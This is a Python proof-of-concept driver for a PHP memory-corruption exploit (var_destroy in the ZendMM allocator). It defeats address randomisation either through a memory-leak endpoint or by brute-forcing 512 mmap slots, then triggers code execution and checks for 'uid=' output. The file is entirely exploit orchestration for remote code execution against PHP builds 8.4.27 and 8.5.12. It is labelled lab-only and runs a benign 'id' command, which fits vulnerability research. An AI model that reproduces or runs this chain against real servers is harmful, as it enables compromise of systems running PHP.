#!/usr/bin/env python3
"""Plan B — one driver: choose the cheapest address seed, then fire.

Seed strategy:
  1. If a GH-22554-style in-band leak endpoint is available, leak the ZendMM
     ``main`` chunk (one request; 8.4.27 only) and scan only the 32 libphp
     positions in the slot above it.
  2. Otherwise brute-force the 512-slot main window (works on 18-bit mmap).

Both paths end in the same var_destroy fire and return ``uid=``. The fire sink
is the lab ``/vd.php`` harness until the real-sink work lands.

Usage:
  # 8.4.27: leak-seeded (fast)
  python3 poc/verify_vardestroy_auto.py --target 127.0.0.1:18169 \\
      --container bf-leak-8427 --build 8.4.27 --leak-path /eval.php
  # 8.5.12: leak is fixed -> automatic brute force
  python3 poc/verify_vardestroy_auto.py --target 127.0.0.1:18159 \\
      --container bf-8512 --build 8.5.12 --leak-path /eval.php

Lab-only; fixed benign `id>/tmp/vd`.
"""
import argparse
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.dirname(HERE))

import importlib.util  # noqa: E402


def _load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m


BRUTE = os.path.join(HERE, "verify_vardestroy_bruteforce.py")
LEAK = _load("xpathleak", os.path.join(HERE, "verify_vardestroy_xpathleak.py"))


def run_brute(args, start=None, hi=None):
    argv = [sys.executable, BRUTE, "--target", args.target,
            "--container", args.container,
            "--fast", "--parallel", str(args.parallel)]
    if args.build:
        argv += ["--build", args.build]
    if start is not None:
        argv += ["--start", hex(start), "--hi", hex(hi)]
    elif args.lo and args.hi:
        argv += ["--lo", args.lo, "--hi", args.hi]
    if args.delta:
        argv += ["--delta", args.delta]
    if args.zif_off:
        argv += ["--zif-off", args.zif_off]
    r = subprocess.run(argv)
    return r.returncode


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", default="127.0.0.1:18169")
    ap.add_argument("--container", default="bf-leak-8427")
    ap.add_argument("--build", default=None,
                    help="auto-detect from the container when omitted")
    ap.add_argument("--leak-path", default="/eval.php",
                    help="endpoint that runs the GH-22554 payload (lab eval)")
    ap.add_argument("--parallel", type=int, default=16)
    ap.add_argument("--lo", default=None)
    ap.add_argument("--hi", default=None)
    ap.add_argument("--delta", default=None)
    ap.add_argument("--zif-off", default=None)
    args = ap.parse_args()
    host, _, port = args.target.partition(":")
    port = int(port or 80)

    if args.leak_path:
        print(f"[1] trying in-band leak via {args.leak_path}")
        try:
            m = LEAK.leak_main(host, port, args.leak_path)
        except (SystemExit, Exception) as exc:  # noqa: BLE001
            print(f"    leak unavailable ({exc}); falling back to brute force")
            m = None
        if m:
            print(f"    main={m:#x} -> scan 32 lib positions only")
            return run_brute(args, m, m + 0x200000)

    print("[2] full 512-slot brute force")
    return run_brute(args)


if __name__ == "__main__":
    raise SystemExit(main())
